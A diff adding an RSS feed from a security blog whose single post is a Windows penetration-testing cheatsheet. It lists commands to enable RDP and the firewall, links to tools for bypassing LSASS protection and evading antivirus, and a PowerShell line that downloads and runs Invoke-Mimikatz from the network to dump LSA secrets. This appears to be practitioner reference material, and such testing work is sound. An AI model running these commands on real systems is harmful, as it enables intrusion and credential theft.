@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>microsoft &#8211; \x44\x61\x6e\x6b</title>
+	<atom:link href="/index.php/tag/microsoft/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>Dank adventures in security</description>
+	<lastBuildDate>Tue, 15 Nov 2022 02:09:06 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.1.1</generator>
+	<item>
+		<title>Cheatsheet &#8211; Microsoft Windows Pentesting</title>
+		<link>/index.php/2021/07/19/cheatsheet-microsoft-windows/</link>
+					<comments>/index.php/2021/07/19/cheatsheet-microsoft-windows/#respond</comments>
+		
+		<dc:creator><![CDATA[Dank]]></dc:creator>
+		<pubDate>Mon, 19 Jul 2021 10:26:38 +0000</pubDate>
+				<category><![CDATA[Cheat Sheet]]></category>
+		<category><![CDATA[Windows]]></category>
+		<category><![CDATA[cheatsheet]]></category>
+		<category><![CDATA[microsoft]]></category>
+		<category><![CDATA[windows]]></category>
+		<guid isPermaLink="false">/blog/?p=71</guid>
+
+					<description><![CDATA[A living cheatsheet of commands and tips i've encountered during my day to day which are good enough to share :)]]></description>
+										<content:encoded><![CDATA[
+<p class="has-large-font-size"><strong>Random Notes:</strong></p>
+
+
+
+<ul><li>Testing for CLM: </li></ul>
+
+
+
+<pre class="wp-block-preformatted">$ExecutionContext.SessionState.LanguageMode</pre>
+
+
+
+<ul><li>Enable RDP &amp; Firewall:<ul><li>reg add &#8220;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#8221; /v fDenyTSConnections /t REG_DWORD /d 0 /f</li><li>netsh firewall set service type = remotedesktop mode = enable</li></ul></li></ul>
+
+
+
+<p class="has-large-font-size"><strong>Local Privilege Escalation:</strong></p>
+
+
+
+<p>Cheatsheet Resources:</p>
+
+
+
+<ul><li>https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</li></ul>
+
+
+
+<p class="has-large-font-size"><strong>Dumping Credentials:</strong></p>
+
+
+
+<p>Bypassing PPL:</p>
+
+
+
+<ul><li>https://github.com/itm4n/PPLdump</li><li>https://github.com/RedCursorSecurityConsulting/PPLKiller</li></ul>
+
+
+
+<p>Dump LSASS bypassing AV/EDR</p>
+
+
+
+<ul><li>https://github.com/outflanknl/Dumpert</li></ul>
+
+
+
+<p>Mimikatz:</p>
+
+
+
+<ul><li>https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz<ul><li>iex (New-Object Net.Webclient).DownloadString(&#8220;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1&#8221;)</li><li>Invoke-Mimikatz -Command &#8216;&#8221;token::elevate&#8221; &#8220;lsadump::secrets&#8221;&#8216;</li></ul></li></ul>
+]]></content:encoded>
+					
+					<wfw:commentRss>/index.php/2021/07/19/cheatsheet-microsoft-windows/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
